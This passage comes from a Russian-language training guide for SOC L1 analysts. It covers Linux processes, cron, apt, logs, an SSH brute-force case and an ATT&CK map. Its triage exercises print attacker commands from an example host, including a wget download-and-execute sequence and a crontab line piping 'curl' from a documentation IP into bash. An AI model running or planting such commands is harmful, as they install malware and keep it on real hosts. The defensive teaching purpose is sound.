+<li><strong><code>/etc</code></strong> — настройки системы и сервисов: <code>passwd</code>, <code>shadow</code>, <code>sudoers</code>, <code>crontab</code>, <code>ssh/sshd_config</code>. Изменения здесь — всегда повод спросить «кто и зачем».</li>
+<li><strong><code>/var</code></strong> — изменяемые данные. Главное для тебя — <strong><code>/var/log</code></strong>, дом логов <sup class="refs">[<a class="ref" href="#src-fhs">15</a>]</sup>.</li>
+<li><strong><code>/root</code></strong> — домашний каталог root. Не путай с корнем <code>/</code>: «/root» — это папка внутри корня.</li>
+<li><strong><code>/tmp</code></strong> — временные файлы. Писать туда может любой пользователь и любой процесс, а при перезагрузке содержимое обычно чистится. Отсюда двойная проблема: сюда удобно класть вредоносные файлы, и отсюда же быстро пропадают улики.</li>
+<li><strong><code>/home</code></strong> — дома пользователей: <code>.bash_history</code>, <code>.ssh/authorized_keys</code>, личные скрипты.</li>
+<li><strong><code>/proc</code></strong> — не файлы на диске, а окно в живое ядро. У каждого процесса там своя папка <code>/proc/&lt;PID&gt;/</code>: командная строка, открытые файлы, текущий каталог. Пригодится в главе 3.</li>
+</ul>
+<aside class="mistakes"><div class="kicker">Где ошибаются новички</div><ul>
+<li><strong>Путать <code>/</code> и <code>/root</code>.</strong> «В корне» и «в папке root» — разные места.</li>
+<li><strong><code>chmod 777</code> «чтобы заработало».</strong> Это «все могут всё». На сервере такое — находка для атакующего и пункт в любом аудите.</li>
+<li><strong>Считать вход по SSH легитимным, раз пароль верный.</strong> Верный пароль доказывает только то, что пароль знали.</li>
+<li><strong>Не смотреть скрытые файлы.</strong> <code>ls</code> без <code>-a</code> не покажет <code>/tmp/.x</code>.</li>
+<li><strong>Путать <code>su</code> и <code>sudo</code>.</strong> <code>su</code> спрашивает пароль целевого пользователя, <code>sudo</code> — твой. И следы в логе у них разные.</li>
+<li><strong>Поверить расширению.</strong> <code>.png</code>, <code>.txt</code>, <code>.pdf</code> ничего не значат, пока <code>file</code> не сказал, что внутри.</li>
+</ul></aside>
+<div class="terms"><div class="kicker">Термины</div><div class="tw"><table><thead><tr><th>EN</th><th>RU</th><th>DE</th></tr></thead><tbody><tr><td>permissions</td><td>права доступа</td><td>Berechtigungen / Zugriffsrechte</td></tr><tr><td>owner / group</td><td>владелец / группа</td><td>Besitzer / Gruppe</td></tr><tr><td>user account</td><td>учётная запись</td><td>Benutzerkonto</td></tr><tr><td>to switch user</td><td>сменить пользователя</td><td>Benutzer wechseln</td></tr><tr><td>hidden file</td><td>скрытый файл</td><td>versteckte Datei</td></tr><tr><td>public key</td><td>открытый ключ</td><td>öffentlicher Schlüssel</td></tr><tr><td>root directory</td><td>корневой каталог</td><td>Wurzelverzeichnis</td></tr><tr><td>privilege escalation</td><td>повышение привилегий</td><td>Rechteausweitung</td></tr><tr><td>baseline</td><td>базовая линия, «норма»</td><td>Baseline / Normalzustand</td></tr><tr><td>benign true positive</td><td>реальное, но разрешённое событие</td><td>harmloses True Positive</td></tr></tbody></table></div></div>
+<p><strong>Связи.</strong> Права и SUID вернутся в комнатах про повышение привилегий в Linux, <code>/etc/passwd</code>, <code>authorized_keys</code> и <code>.bash_history</code> — в Linux Forensics. SSH-логи будут в каждом модуле про SIEM.</p>
+<h2 id="ch3">Глава 3. Процессы, автозапуск, пакеты и логи (Part 3)</h2>
+<p><strong>Аналогия.</strong> Если файлы — это вещи на складе, то процессы — это работники в цеху прямо сейчас. У каждого бейдж с номером (PID), кто-то главнее (родительский процесс), кто-то ест слишком много электричества (CPU и память). cron — это доска с расписанием: «в 3 ночи включить конвейер». Логи — это журнал на вахте, куда всё записывается. Работа L1 в разборе Linux-хоста часто и есть чтение этих трёх вещей: кто сейчас работает, что запускается по расписанию и что записано в журнал.</p>
+<p><strong>Зачем это SOC-аналитику.</strong> Вредонос — это тоже процесс. Он должен как-то переживать перезагрузку, а значит цепляется за автозапуск, чаще всего за cron. И всё это оставляет строки в логах. Три темы этой главы — ровно те три места, куда ты смотришь, разбирая подозрительный Linux-хост.</p>
+<h3>Редакторы: nano и vim</h3>
+<p>Task 3 даёт два терминальных редактора <sup class="refs">[<a class="ref" href="#src-thm-lf3">16</a>]</sup>. <strong>nano</strong> простой: <code>nano file.txt</code>, внизу подсказки, <code>^</code> значит Ctrl. Сохранить — Ctrl+O, выйти — Ctrl+X. Для заметок хватает.</p>
+<p><strong>vim</strong> мощнее и живёт вообще на любом сервере, но у него есть режимы, и новичок в нём застревает. Минимум, чтобы выбраться: нажми <code>Esc</code>, потом набери <code>:q!</code> и Enter — это «выйти без сохранения». Сохранить и выйти — <code>:wq</code>. Одно это спасёт тебя, когда <code>git</code> или <code>crontab -e</code> внезапно откроют vim.</p>
+<p>Для SOC редактор — инструмент чтения. Конфиг, скрипт из cron, подозрительный файл ты <strong>открываешь на чтение, не меняя</strong>. И безопаснее смотреть чужой файл через <code>cat</code>, <code>less</code> или <code>file</code>, а не открывать в редакторе: меньше шансов случайно сохранить и сбить метаданные.</p>
+<h3>Утилиты передачи файлов: wget, scp, http.server</h3>
+<p>Task 4 — как файлы попадают на машину и с машины <sup class="refs">[<a class="ref" href="#src-thm-lf3">16</a>]</sup>:</p>
+<ul>
+<li><strong><code>wget адрес</code></strong> — скачать файл по HTTP(S). На маке из коробки его нет, там <code>curl -O адрес</code>.</li>
+<li><strong><code>scp откуда куда</code></strong> — копировать по SSH между машинами: <code>scp file.txt user@host:/tmp/</code>. Шифрованно, поверх того же 22-го порта.</li>
+<li><strong><code>python3 -m http.server</code></strong> — за одну команду поднять веб-сервер, раздающий текущий каталог. По умолчанию порт <strong>8000</strong>; официально сама документация предупреждает, что это <strong>не для продакшена</strong> <sup class="refs">[<a class="ref" href="#src-pyhttp">17</a>]</sup>. Удобно быстро перекинуть файл между своими машинами в лабе.</li>
+</ul>
+<p>Теперь то же самое глазами защитника. Первое, что делает атакующий, закрепившись на хосте, — подтягивает инструменты снаружи, и делает он это теми же <code>wget</code> и <code>curl</code>. В ATT&amp;CK это Ingress Tool Transfer (T1105), тактика Command and Control <sup class="refs">[<a class="ref" href="#src-t1105">18</a>]</sup>. Поэтому в логах и в истории команд строка <code>wget http://&lt;чужой-IP&gt;/x -O /tmp/.x</code> — это сразу несколько красных флагов: скачивание с сырого IP, в скрытый файл, в <code>/tmp</code>.</p>
+<p>Дальше в главе будет второй, отдельный кейс — <strong>учебный пример другого хоста</strong>, который уже пробили (не наш <code>fztu</code>, с ним разбираемся отдельно). IP-адреса в нём из диапазона <code>203.0.113.0/24</code>, который RFC 5737 отвёл специально для примеров, чтобы ни один реальный адрес не оказался «злодеем».</p>
+<div class="triage" data-answer="TP"><div class="kicker">Триаж</div><div class="ttitle">Учебный пример (другой хост). На веб-сервере в истории команд аккаунта <code>www-data</code>:</div><pre class="log"><code>www-data$ cd /tmp
+www-data$ wget http://203.0.113.66/kworker -O /tmp/.sys/kworker
+www-data$ chmod +x /tmp/.sys/kworker
+www-data$ ./.sys/kworker &amp;</code></pre><div class="verdicts"><button type="button" class="verdict" data-v="TP">Инцидент (TP)</button><button type="button" class="verdict" data-v="FP">Ложное (FP)</button><button type="button" class="verdict" data-v="DIG">Копать дальше</button></div><div class="why" hidden><p><strong>Настоящий инцидент, эскалация.</strong> Здесь сходится сразу цепочка: скачивание бинарника с сырого IP (Ingress Tool Transfer, T1105 <sup class="refs">[<a class="ref" href="#src-t1105">18</a>]</sup>), укладка в скрытую папку внутри <code>/tmp</code>, выдача прав на исполнение и запуск в фоне (<code>&amp;</code>). Отдельный флаг — сам аккаунт: <code>www-data</code> это служебная учётка веб-сервера, ей вообще не положено скачивать файлы и что-то запускать. Имя <code>kworker</code> мимикрирует под системный процесс ядра — типичная маскировка майнеров и ботов.</p>
+<p>Что делает L1: фиксирует находку (файл, IP, время, пользователя), обогащает <code>203.0.113.66</code>, поднимает приоритет и <strong>эскалирует на L2/IR</strong> с чётким таймлайном. Чего L1 <strong>не</strong> делает сам: не убивает процесс, не удаляет файл, не изолирует и не перезагружает хост — это меняет картину и решается L2/IR. Твой продукт — точный таймлайн и рекомендация, а не действие на чужой машине.</p></div></div>
+<h3>Процессы 101</h3>
+<p>Task 5 — процессы <sup class="refs">[<a class="ref" href="#src-thm-lf3">16</a>]</sup>. Ключевые команды:</p>
+<table>
+<thead>
+<tr>
+<th>Команда</th>
+<th>Что делает</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>ps</code></td>
+<td>процессы текущего сеанса</td>
+</tr>
+<tr>
+<td><code>ps aux</code></td>
+<td><strong>все</strong> процессы в системе, с пользователем, CPU, памятью</td>
+</tr>
+<tr>
+<td><code>top</code> / <code>htop</code></td>
+<td>живой список, обновляется, сортировка по нагрузке</td>
+</tr>
+<tr>
+<td><code>kill PID</code></td>
+<td>послать процессу сигнал (по умолчанию — вежливое завершение)</td>
+</tr>
+<tr>
+<td><code>systemctl</code></td>
+<td>управлять сервисами (службами)</td>
+</tr>
+</tbody>
+</table>
+<p>У каждого процесса есть <strong>PID</strong> — номер, который система выдаёт по возрастанию. Комната спрашивает про следующий PID после заданного: логика простая, номера идут по порядку выдачи. У каждого процесса есть и родитель (PPID): процессы рождаются из других процессов. Дерево «кто кого запустил» — главный инструмент разбора: веб-сервер, внезапно породивший <code>bash</code>, а тот <code>wget</code>, — это почти всегда взлом.</p>
+<p><code>ps aux</code> в связке с пайпом решает половину задач по процессам:</p>
+<pre><code>ps aux --sort=-%cpu | head -5        # топ-5 прожорливых по CPU
+ps aux | grep -i ssh                 # все процессы, связанные с ssh
+</code></pre>
+<p>Внезапный процесс на 100% CPU, которого раньше не было, — классический признак майнера. В ATT&amp;CK это Resource Hijacking: Compute Hijacking (T1496.001), тактика Impact <sup class="refs">[<a class="ref" href="#src-t1496-001">19</a>]</sup>.</p>
+<p><strong>Сигналы.</strong> <code>kill</code> не обязательно «убить», он посылает сигнал <sup class="refs">[<a class="ref" href="#src-signal7">20</a>]</sup>:</p>
+<table>
+<thead>
+<tr>
+<th>Сигнал</th>
+<th>Номер</th>
+<th>Что значит</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>SIGTERM</code></td>
+<td>15</td>
+<td>вежливо: «заверши работу», дав процессу прибраться. Это <code>kill PID</code> по умолчанию</td>
+</tr>
+<tr>
+<td><code>SIGKILL</code></td>
+<td>9</td>
+<td>грубо: система обрывает процесс немедленно, прибраться он не успевает</td>
+</tr>
+<tr>
+<td><code>SIGHUP</code></td>
+<td>1</td>
+<td>«перечитай конфиг» (у многих демонов)</td>
+</tr>
+<tr>
+<td><code>SIGSTOP</code>/<code>SIGCONT</code></td>
+<td>19 / 18</td>
+<td>приостановить / продолжить</td>
+</tr>
+</tbody>
+</table>
+<p>Разница между <code>kill PID</code> и <code>kill -9 PID</code> — та самая, о которой спрашивают на собеседовании. <code>-9</code> (SIGKILL) применяют, когда процесс завис и не реагирует на вежливое <code>SIGTERM</code>. Важная деталь: <strong>SIGKILL и SIGSTOP нельзя перехватить, заблокировать или проигнорировать</strong> <sup class="refs">[<a class="ref" href="#src-signal7">20</a>]</sup> — их обрабатывает само ядро, поэтому они и работают всегда.</p>
+<p><strong>systemctl</strong> управляет сервисами через systemd — систему, которая на большинстве современных дистрибутивов запускает и следит за фоновыми службами:</p>
+<pre><code>systemctl status ssh     # состояние службы
+systemctl stop ssh       # остановить сейчас
+systemctl start ssh      # запустить сейчас
+systemctl enable ssh     # запускать при загрузке
+systemctl disable ssh    # не запускать при загрузке
+</code></pre>
+<p>Помни различие: <code>start</code>/<code>stop</code> — про «прямо сейчас», <code>enable</code>/<code>disable</code> — про «после перезагрузки». Комната спрашивает про оба; какая из четырёх подходит под её формулировку — реши сам. Атакующие тоже создают свои systemd-сервисы для закрепления, поэтому незнакомая служба в <code>systemctl list-units --type=service</code> — ещё одно место для проверки.</p>
+<p><strong>Фон и передний план.</strong> <code>команда &amp;</code> запускает в фоне. <code>jobs</code> показывает фоновые задачи текущего сеанса, <code>fg</code> возвращает задачу на передний план, <code>Ctrl+Z</code> приостанавливает текущую, <code>bg</code> продолжает её в фоне. Комнатный вопрос про возврат процесса на передний план — это одна из этих четырёх; сопоставь сам.</p>
+<h3>Автоматизация: cron</h3>
+<p>Task 6 — cron, планировщик <sup class="refs">[<a class="ref" href="#src-thm-lf3">16</a>]</sup>. Он раз в минуту проверяет расписания и запускает то, что подошло по времени. Своё расписание правят через <code>crontab -e</code>, смотрят — <code>crontab -l</code>.</p>
+<p>Строка расписания — пять полей времени и команда <sup class="refs">[<a class="ref" href="#src-crontab5">21</a>]</sup>:</p>
+<div class="field"><div class="kicker">Разбор строки — жми на кусок</div><div class="ftitle">Строка crontab</div><div class="fline"><button type="button" class="seg" data-i="0">0</button> <button type="button" class="seg" data-i="1">3</button> <button type="button" class="seg" data-i="2">*</button> <button type="button" class="seg" data-i="3">*</button> <button type="button" class="seg" data-i="4">1</button> <button type="button" class="seg" data-i="5">/usr/local/bin/backup.sh</button></div><div class="fnotes"><div class="segnote" data-i="0" hidden><code>0</code> — Минута (0–59). Здесь 0.</div><div class="segnote" data-i="1" hidden><code>3</code> — Час (0–23). Здесь 3 — три часа ночи.</div><div class="segnote" data-i="2" hidden><code>*</code> — День месяца (1–31). Звёздочка — «любой».</div><div class="segnote" data-i="3" hidden><code>*</code> — Месяц (1–12). Любой.</div><div class="segnote" data-i="4" hidden><code>1</code> — День недели (0–7, где 0 и 7 — воскресенье). Здесь 1 — понедельник.</div><div class="segnote" data-i="5" hidden><code>/usr/local/bin/backup.sh</code> — Что запустить. Тут — скрипт бэкапа.</div><div class="fhint">Нажми на любой подсвеченный фрагмент.</div></div><button type="button" class="fall">Показать все пояснения</button></div>
+<p>Читается справа налево по смыслу: «каждый понедельник в 03:00 запусти backup.sh». Комнатный вопрос «когда выполнится crontab» — это чтение таких пяти полей. Тренажёр — crontab.guru: вводишь строку, он переводит на человеческий.</p>
+<p>Есть и сокращения: <code>@reboot</code> — «выполнить один раз после загрузки», <code>@daily</code>, <code>@hourly</code> <sup class="refs">[<a class="ref" href="#src-crontab5">21</a>]</sup>. И два уровня cron: пользовательский (<code>crontab -e</code>, от имени этого пользователя) и системный (<code>/etc/crontab</code> и <code>/etc/cron.d/*</code>), где в строке <strong>добавляется поле пользователя</strong> — от кого запускать <sup class="refs">[<a class="ref" href="#src-crontab5">21</a>]</sup>.</p>
+<p>Почему cron — тема номер один для SOC на Linux: это самый популярный способ закрепления. Задача в cron переживает перезагрузку и запускается сама. В ATT&amp;CK это Scheduled Task/Job: Cron (T1053.003), сразу три тактики — Execution, Persistence, Privilege Escalation <sup class="refs">[<a class="ref" href="#src-t1053-003">22</a>]</sup>. Что смотрит защитник: <code>crontab -l</code> у каждого пользователя, <code>/etc/cron.d/</code>, <code>/etc/crontab</code>, каталоги <code>/etc/cron.daily</code> и рядом. Красные флаги — задача, которая тянет и запускает что-то из <code>/tmp</code> или <code>/dev/shm</code>, обфусцированная команда (base64, длинная цепочка), <code>@reboot</code> со скриптом в скрытой папке.</p>
+<div class="triage" data-answer="TP"><div class="kicker">Триаж</div><div class="ttitle">Учебный пример (тот же пробитый хост). В пользовательском crontab (<code>crontab -l</code> от <code>www-data</code>):</div><pre class="log"><code>@reboot /tmp/.sys/kworker
+*/5 * * * * curl -s http://203.0.113.66/c | bash</code></pre><div class="verdicts"><button type="button" class="verdict" data-v="TP">Инцидент (TP)</button><button type="button" class="verdict" data-v="FP">Ложное (FP)</button><button type="button" class="verdict" data-v="DIG">Копать дальше</button></div><div class="why" hidden><p><strong>Инцидент, эскалация.</strong> Обе строки — учебник по закреплению. <code>@reboot /tmp/.sys/kworker</code> заново запускает тот самый скрытый бинарник после каждой перезагрузки. Вторая строка каждые 5 минут тянет команды с внешнего IP и сразу исполняет их (<code>| bash</code>) — это и канал управления, и повторное заражение. Техника — Scheduled Task/Job: Cron (T1053.003) <sup class="refs">[<a class="ref" href="#src-t1053-003">22</a>]</sup> в связке с Ingress Tool Transfer (T1105) <sup class="refs">[<a class="ref" href="#src-t1105">18</a>]</sup>.</p>
+<p>L1: зафиксировать обе строки дословно, привязать ко времени и пользователю, обогатить IP, эскалировать. Правку самого crontab и остановку задачи выполняет L2/IR: если снести файл, но оставить строку <code>@reboot</code>, после перезагрузки всё вернётся, а картина будет испорчена.</p></div></div>
+<h3>Пакеты: apt</h3>
+<p>Task 7 — менеджер пакетов <sup class="refs">[<a class="ref" href="#src-thm-lf3">16</a>]</sup>. На Debian/Ubuntu это <code>apt</code>. Он ставит программы из репозиториев вместе со всеми зависимостями:</p>
+<pre><code>sudo apt update              # обновить список доступных пакетов
+sudo apt install nmap        # поставить пакет
+sudo apt remove nmap         # удалить
+apt list --installed         # что установлено
+</code></pre>
+<p>Репозиторий — это сервер с проверенными пакетами. Пакеты подписаны ключами, и apt проверяет подпись, чтобы тебе не подсунули поддельную программу. Раньше ключи добавляли командой <code>apt-key</code>, но она объявлена устаревшей: последними её версиями были Debian 11 и Ubuntu 22.04, а ключи теперь кладут в <code>/etc/apt/keyrings</code> и указывают через опцию <code>Signed-By</code> <sup class="refs">[<a class="ref" href="#src-apt-key">23</a>]</sup>. Знать это стоит, потому что старые инструкции в интернете всё ещё учат <code>apt-key</code>, и в свежей системе они не сработают.</p>
+<p>Для SOC интересен <code>add-apt-repository</code>: он добавляет сторонний источник пакетов. Чужой репозиторий, добавленный без ведома админа, — это способ поставить что угодно «легально». Смотри <code>/etc/apt/sources.list</code> и <code>/etc/apt/sources.list.d/</code>: там не должно быть источников, которых клиент не заводил.</p>
+<h3>Логи: /var/log</h3>
+<p>Task 8 — то, ради чего половина этого учебника <sup class="refs">[<a class="ref" href="#src-thm-lf3">16</a>]</sup>. Логи Linux лежат в <strong><code>/var/log</code></strong>. Это обычные текстовые файлы, читаются тем же <code>cat</code>, <code>less</code>, <code>grep</code>, <code>tail</code>. Файлы, которые встретишь чаще всего:</p>
+<table>
+<thead>
+<tr>
+<th>Файл</th>
+<th>Что внутри</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>/var/log/auth.log</code> (Debian/Ubuntu) или <code>/var/log/secure</code> (RHEL/CentOS)</td>
+<td>вход, sudo, su, SSH — твой главный файл</td>
+</tr>
+<tr>
+<td><code>/var/log/syslog</code></td>
+<td>общие системные события</td>
+</tr>
+<tr>
+<td><code>/var/log/apache2/access.log</code></td>
+<td>все запросы к веб-серверу Apache</td>
+</tr>
+<tr>
+<td><code>/var/log/apache2/error.log</code></td>
+<td>ошибки веб-сервера</td>
+</tr>
+<tr>
+<td><code>/var/log/nginx/…</code></td>
+<td>то же для nginx</td>
+</tr>
+</tbody>
+</table>
+<p>Задание про Apache: найти в логе, какой IP заходил и какой файл запрашивал. Строка Apache в Common Log Format читается так <sup class="refs">[<a class="ref" href="#src-apache-logs">24</a>]</sup>:</p>
+<div class="field"><div class="kicker">Разбор строки — жми на кусок</div><div class="ftitle">Строка Apache access.log</div><div class="fline"><button type="button" class="seg" data-i="0">203.0.113.9</button> - - <button type="button" class="seg" data-i="1">[23/Sep/2026:11:07:14 +0200]</button> &quot;<button type="button" class="seg" data-i="2">GET</button> <button type="button" class="seg" data-i="3">/admin/login.php</button> HTTP/1.1&quot; <button type="button" class="seg" data-i="4">200</button> <button type="button" class="seg" data-i="5">1043</button></div><div class="fnotes"><div class="segnote" data-i="0" hidden><code>203.0.113.9</code> — IP клиента, который сделал запрос. Первое, что вытаскиваешь.</div><div class="segnote" data-i="1" hidden><code>[23/Sep/2026:11:07:14 +0200]</code> — Время. У Apache, в отличие от syslog, <strong>есть год и часовой пояс</strong> (+0200 — это CEST). В отчёте это большой плюс.</div><div class="segnote" data-i="2" hidden><code>GET</code> — Метод HTTP. GET — забрать, POST — отправить (например, форму логина).</div><div class="segnote" data-i="3" hidden><code>/admin/login.php</code> — Запрошенный путь. Именно его спрашивает комната как «какой файл открывали».</div><div class="segnote" data-i="4" hidden><code>200</code> — Код ответа. 200 — успех, 404 — нет такого, 403 — запрещено, 5xx — ошибка сервера.</div><div class="segnote" data-i="5" hidden><code>1043</code> — Размер ответа в байтах.</div><div class="fhint">Нажми на любой подсвеченный фрагмент.</div></div><button type="button" class="fall">Показать все пояснения</button></div>
+<p>Строка учебная, но формат настоящий. Пачка запросов от одного IP с кодами 404 подряд — это сканер перебирает пути; много POST на <code>login.php</code> — перебор пароля к веб-форме.</p>
+<details class="deep"><summary><span class="kicker">Копнуть глубже</span> journald — там, где нет auth.log</summary><p>На новых системах с systemd логи часто живут не в текстовых файлах, а в бинарном журнале journald, и читают их командой <code>journalctl</code>, а не <code>cat</code>. Например, с Debian 12 rsyslog больше не ставится по умолчанию <sup class="refs">[<a class="ref" href="#src-debian12-log">25</a>]</sup>. Полезный минимум <sup class="refs">[<a class="ref" href="#src-man-journalctl">26</a>]</sup>:</p>
+<pre><code>journalctl -u ssh              # логи только службы ssh
+journalctl -u ssh --since &quot;1 hour ago&quot;
+journalctl -f                  # хвост в реальном времени, как tail -f
+journalctl _PID=24680          # всё от конкретного процесса
+</code></pre>
+<p>Смысл тот же, что у <code>auth.log</code>, просто другой доступ. Увидишь на сервере пустой <code>/var/log/auth.log</code> — не радуйся, что «логов нет», а проверь journald.</p></details>
+<details class="deep"><summary><span class="kicker">Копнуть глубже</span> Ротация логов и почему это ловушка на смене</summary><p>Логи не растут вечно: <code>logrotate</code> раз в день архивирует их и режет. Поэтому рядом с <code>auth.log</code> лежат <code>auth.log.1</code>, <code>auth.log.2.gz</code> и так далее. Практический вывод: если инцидент был три дня назад, свежий <code>auth.log</code> может уже не содержать нужных строк — ищи в архивах. Сжатые читаются без распаковки: <code>zgrep "Failed password" /var/log/auth.log.2.gz</code>. И обратная сторона: атакующие тоже знают про логи и могут их чистить или подменять — Indicator Removal (T1070) <sup class="refs">[<a class="ref" href="#src-t1070">4</a>]</sup>. Дырка во времени, где логов просто нет, — это само по себе улика.</p></details>
+<aside class="mistakes"><div class="kicker">Где ошибаются новички</div><ul>
+<li><strong><code>kill -9</code> по любому поводу.</strong> SIGKILL не даёт процессу прибраться и может побить данные. Сначала обычный <code>kill</code> (SIGTERM), <code>-9</code> — если завис.</li>
+<li><strong>Путать <code>stop</code> и <code>disable</code>.</strong> Остановил службу, но не выключил автозапуск — после перезагрузки она вернётся.</li>
+<li><strong>Читать cron слева направо словами.</strong> Поля жёсткие: минута, час, день месяца, месяц, день недели.</li>
+<li><strong>Забыть про системный cron.</strong> Пользовательский <code>crontab -l</code> чист, а закладка сидит в <code>/etc/cron.d/</code>.</li>
+<li><strong>Радоваться пустому логу.</strong> Пусто — это либо journald вместо текстовых файлов, либо ротация, либо кто-то почистил. Все три варианта надо проверить.</li>
+<li><strong>L1 «чинит» хост сам.</strong> Убил процесс, снёс файл, перезагрузил — испортил улики и, возможно, спугнул атакующего, не закрыв вход. Твоя работа — таймлайн и эскалация.</li>
+</ul></aside>
+<div class="terms"><div class="kicker">Термины</div><div class="tw"><table><thead><tr><th>EN</th><th>RU</th><th>DE</th></tr></thead><tbody><tr><td>process</td><td>процесс</td><td>Prozess</td></tr><tr><td>signal</td><td>сигнал</td><td>Signal</td></tr><tr><td>service / daemon</td><td>служба / демон</td><td>Dienst / Daemon</td></tr><tr><td>scheduled task (cron)</td><td>задача по расписанию</td><td>geplante Aufgabe</td></tr><tr><td>package manager</td><td>менеджер пакетов</td><td>Paketverwaltung</td></tr><tr><td>repository</td><td>репозиторий, источник пакетов</td><td>Paketquelle</td></tr><tr><td>log file</td><td>файл журнала</td><td>Protokolldatei / Logdatei</td></tr><tr><td>persistence</td><td>закрепление в системе</td><td>Persistenz</td></tr><tr><td>log rotation</td><td>ротация логов</td><td>Log-Rotation</td></tr><tr><td>timeline</td><td>таймлайн, хронология</td><td>Zeitleiste / Zeitachse</td></tr></tbody></table></div></div>
+<p><strong>Связи.</strong> Процессы, cron и логи — фундамент комнат Linux Forensics, Linux Process Analysis и Linux Incident Surface. cron как закрепление встретишь в Persistence-комнатах. Логи <code>/var/log</code> ты будешь заливать в Splunk и Sentinel и писать по ним правила на путях SOC Level 1.</p>
+<h2 id="finale">Финал: закрываем тикет и где граница L1</h2>
+<p>Три комнаты пройдены, сюжет можно свести к одному отчёту. Что мы узнали по <code>OpenSSH_2k.log</code>:</p>
+<ul>
+<li>перебор паролей подтверждён: <strong>520</strong> строк <code>Failed password</code>, а с учётом строк <code>message repeated</code> — <strong>528</strong> попыток;</li>
+<li>источников — <strong>23</strong> уникальных IP, главный — <strong>183.62.140.253</strong> (286 неудач), за ним 187.141.143.180 (80) и 103.99.0.122 (46);</li>
+<li>ломились в основном в <code>root</code> (370 строк) и в несуществующие имена (135), то есть шёл и подбор пароля, и подбор логинов;</li>
+<li><strong>успешный вход по паролю за весь период один</strong> — <code>fztu</code> с <code>119.137.62.142</code>, и он <strong>не связан</strong> с перебором (ноль неудачных попыток, IP в атаке не участвует).</li>
+</ul>
+<p>Вывод L1: brute force реальный, но за отрезок лога <strong>не результативный</strong>. Вход <code>fztu</code> требует подтверждения у клиента, но на взлом не похож. Рекомендации в тикет: отключить вход по паролю снаружи, запретить прямой вход root, поставить fail2ban, заблокировать топ-IP. Если клиент подтверждает <code>fztu</code> — закрываем; если нет — эскалация.</p>
+<h3>Что делает L1 и где его граница</h3>
+<p>Это в комнатах не написано, но на собеседовании и на смене спрашивают в первую очередь. <strong>L1 — это сортировка и подтверждение</strong>, а не устранение.</p>
+<p><strong>L1 делает:</strong> берёт алерт в SLA, поднимает сырые логи, строит таймлайн, обогащает индикаторы (IP, домены, хэши), отсекает ложные, пишет понятный тикет, эскалирует настоящее на L2 с фактами и временем.</p>
+<p><strong>L1 не делает сам</strong> (это L2 / Incident Response): не изолирует хост от сети, не блокирует и не удаляет учётки, не убивает процессы и не удаляет файлы на боевой машине, не перезагружает сервер. Причина одна и та же везде в этом учебнике: любое такое действие меняет картину, может уничтожить улики и спугнуть атакующего, не закрыв вход. Твой продукт — <strong>точный таймлайн и обоснованная рекомендация</strong>, а не действие на чужой системе.</p>
+<h3>Карта MITRE ATT&amp;CK по модулю</h3>
+<p>Всё, что встретилось в трёх комнатах, ложится на этапы атаки. Жми по ленте — увидишь технику и где её ловить в логах Linux. Тактики даны по ATT&amp;CK v19.2 <sup class="refs">[<a class="ref" href="#src-mitre-tactics">27</a>]</sup>.</p>
+<div class="killchain"><div class="kicker">Kill chain — жми на этап</div><div class="kcband"><button type="button" class="kc" data-i="0"><span class="kcn">1</span><span class="kcs">Подбор пароля</span><span class="kct">Credential Access</span></button><button type="button" class="kc" data-i="1"><span class="kcn">2</span><span class="kcs">Вход по SSH</span><span class="kct">Lateral Movement</span></button><button type="button" class="kc" data-i="2"><span class="kcn">3</span><span class="kcs">Разведка на хосте</span><span class="kct">Discovery</span></button><button type="button" class="kc" data-i="3"><span class="kcn">4</span><span class="kcs">Подтягивание инструментов</span><span class="kct">Command and Control</span></button><button type="button" class="kc" data-i="4"><span class="kcn">5</span><span class="kcs">Закрепление</span><span class="kct">Persistence</span></button><button type="button" class="kc" data-i="5"><span class="kcn">6</span><span class="kcs">Использование ресурсов</span><span class="kct">Impact</span></button><button type="button" class="kc" data-i="6"><span class="kcn">7</span><span class="kcs">Сокрытие следов</span><span class="kct">Stealth</span></button></div><div class="kcp" data-i="0" hidden><div><b>Техника:</b> Brute Force: Password Guessing — <strong>T1110.001</strong> <sup class="refs">[<a class="ref" href="#src-t1110-001">28</a>]</sup></div><div><b>Что видно в логах:</b> <code>auth.log</code>/<code>OpenSSH</code>: пачки <code>Failed password</code>, много уникальных имён с одного IP</div></div><div class="kcp" data-i="1" hidden><div><b>Техника:</b> Remote Services: SSH — <strong>T1021.004</strong> <sup class="refs">[<a class="ref" href="#src-t1021-004">29</a>]</sup></div><div><b>Что видно в логах:</b> <code>Accepted password</code>/<code>publickey</code>; сверяй IP и время с базовой линией</div></div><div class="kcp" data-i="2" hidden><div><b>Техника:</b> System Owner/User Discovery — <strong>T1033</strong></div><div><b>Что видно в логах:</b> история команд: <code>whoami</code>, <code>id</code>, <code>uname -a</code>, <code>ps aux</code> подряд</div></div><div class="kcp" data-i="3" hidden><div><b>Техника:</b> Ingress Tool Transfer — <strong>T1105</strong> <sup class="refs">[<a class="ref" href="#src-t1105">18</a>]</sup></div><div><b>Что видно в логах:</b> <code>wget</code>/<code>curl</code> с сырого IP в <code>/tmp</code>; новый бинарник, <code>file</code> = ELF</div></div><div class="kcp" data-i="4" hidden><div><b>Техника:</b> Scheduled Task/Job: Cron — <strong>T1053.003</strong> <sup class="refs">[<a class="ref" href="#src-t1053-003">22</a>]</sup></div><div><b>Что видно в логах:</b> новые строки в <code>crontab -l</code>, <code>/etc/cron.d/</code>, особенно <code>@reboot</code></div></div><div class="kcp" data-i="5" hidden><div><b>Техника:</b> Resource Hijacking: Compute Hijacking — <strong>T1496.001</strong> <sup class="refs">[<a class="ref" href="#src-t1496-001">19</a>]</sup></div><div><b>Что видно в логах:</b> процесс на 100% CPU, маскировка под системный (<code>kworker</code>)</div></div><div class="kcp" data-i="6" hidden><div><b>Техника:</b> Indicator Removal: Clear Command History — <strong>T1070.003</strong> <sup class="refs">[<a class="ref" href="#src-t1070">4</a>]</sup></div><div><b>Что видно в логах:</b> пустой <code>.bash_history</code>, дырки во времени в логах</div></div></div>
